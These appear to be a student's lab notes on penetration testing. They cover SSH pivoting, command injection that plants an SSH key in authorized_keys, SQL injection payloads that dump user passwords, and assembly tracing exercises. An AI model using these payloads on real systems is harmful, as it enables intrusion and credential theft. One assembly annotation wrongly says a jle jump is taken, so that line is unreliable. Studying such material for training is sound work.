Control Sockets (different method of port forwarding)
Creates a file that represents the connection to a box. Created on linux opstation that has all of the tools.

lin_ops#  ssh -MS /tmp/jump student@10.50.35.64                                                   #Create initial control socket with jumpbox
lin_ops#  ssh -S /tmp/jump jump                                                                   #Connect to control socket to the jumpbox
lin_ops#  ssh -S /tmp/jump jump -O forward -D9050                                                 #Create dynamic port forward to jumpbox  
lin_ops#  proxychains nmap -Pn -T4 -vvvv 192.168.28.100                                           #Scan Tgt on network found
lin_ops#  ssh -S /tmp/jump jump -O forward -L 1111:192.168.28.100:80 -L 2222:192.168.28.100:2222  #Create static port forwards to 80 and 2222 on 192.168.28.100
lin_ops#  ssh -S /tmp/jump jump -O cancel -D9050                                                  #Will cancel portforward
lin_ops#  nc 127.0.0.1 1111                                                                       #Will test connection to port 80 on 192.168.28.100
lin_ops#  nc 127.0.0.1 2222                                                                       #Will test connection to port 222 on 192.168.28.100
lin_ops# ssh -MS /tmp/web <creds>@127.0.0.1 -p 2222                                               #Will create control socket to web server
lin_ops# firefox                                                                                  #Use firefox to go to 127.0.0.1:1111 to go to webserver


NMAP SCRIPTS
  /usr/share/nmap/scripts
smb-os-discovery
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
COMMAND INJECTION
Begin all new commands with a ;
UPLOAD SSH KEY TO WEB SERVER:
  ; whoami                                                #FIND OUT WHO YOU ARE
  ; cat /etc/passwd                                       #FIND HOME DIRECTORY
  ssh-keygen                                              #CREATE SSH KEY
  cat /home/student/.ssh/id_rsa.pub                       #LOOK AT SSH KEY
  ; mkdir /var/www/.ssh                                   #MAKE .ssh directory
  ; echo "COPIED KEY" >> /var/www/.ssh/authorized_keys    #ECHO YOUR KEY INTO THE .ssh DIRECTORY

      ###Directory Traversal VIA###

URL
FILE SEARCHING
CALL A FUNCTION USING THE DEV TOOLS CONSOLE ()



      ###EASY-5STEP SQL INJECTION###

  1. Identify Vulnerable Fields
  2. Identify # of Columns w/ Golden Statement
  3. Edit Golden Statement
  4. Craft Query
  5. Get Money/Points

FOR GET REQUEST via URL SEND TRUE OF FALSE STATEMENT THEN VIEW POST REQUEST IN WEB DEV TOOLS, PUT A QUESTION MARK IN URL AND COPY AND PASTE RAW DATA SENT IN POST 
tom' OR 1='1
username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271 -> URL....php?username=tom%27+OR+1%3D%271&passwd=tom%27+OR+1%3D%271


          ###POST METHOD###

  Ford' OR 1='1                       #DID NOT WORK
  Dodge' OR 1='1                      #DID NOT WORK
  Honda' OR 1='1                      #DID NOT WORK
  Audi' OR 1='1                       #THIS ONE WORKED
  Audi' UNION SELECT 1,2,3,4; #
  Audi' UNION SELECT 1,2,3,4,5; #
  Audi' UNION SELECT table_schema,2,table_name,column_name,5 FROM information_schema.columns; #
  Audi' UNION SELECT tireid,2,name,size,cost FROM session.Tires; #
  Audi' UNION SELECT id,2,name,pass,5 FROM session.user; #
  Audi 'UNION SELECT @@version,2,3,4,5; #            #SQL VERSION


         ###GET METHOD USING URL###

  http://10.50.35.49/uniondemo.php?Selection=1 OR 1=1                #SELECTION 1 DID NOT WORK
  http://10.50.35.49/uniondemo.php?Selection=2 OR 1=1                #SELECTION 2 DID WORK
  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT 1,2,3
  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
  http://10.50.35.49/uniondemo.php?Selection=2 UNION SELECT% 1,2,@@version      #GETS SQL VERSION
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
          ###REVERSE ENGINEERING###
main: 
  mov rax, 16                      //move into rax the value of 16                                      
  push rax                         //push value of rax (16) onto the stack. stack grows by 8 bytes
  jmp mem2                         //jump to memory location of mem2

mem1:
  mov rax, 0                       //move into rax the value of 0
  ret                              //return value of rax (first return register)(0)

mem2:
  pop r8                           //pop value from top of the stack (16) into r8, r8 is 16. stack shrinks by 8 bytes
  cmp rax, r8                      //compare to the value of rax (16) to the value of r8 (16). r8 is subtracted from rax.
  je mem1                          //zero flag is set from previous operation; values are equal. jmp to mem location of mem1
----------------------------------------------------------------------------------------------------------------------------
main:
  mov rcx, 25                      //move into rcx, the value of 25
  mov rbx, 62                      //move into rbx, the value of 62
  jump mem1                        //jump to memory location of mem1

mem1:
  sub rbx, 40                      //subtract from rbx(62) the value of 40. rbx is now 22
  mov rsi, rbx                     //move into rsi the value of rbx(22)
  cmp rcx, rsi                     //compare to rcx(25) the value of rsi(22). rsi is subtracted from rcx. flag is set.
  jle mem2                         //flag is set. jump to memory location of mem2

mem2:
  mov rax, 0                       //move into rax the value of 0
  ret                              //return the value of rax (first return register)(0)

























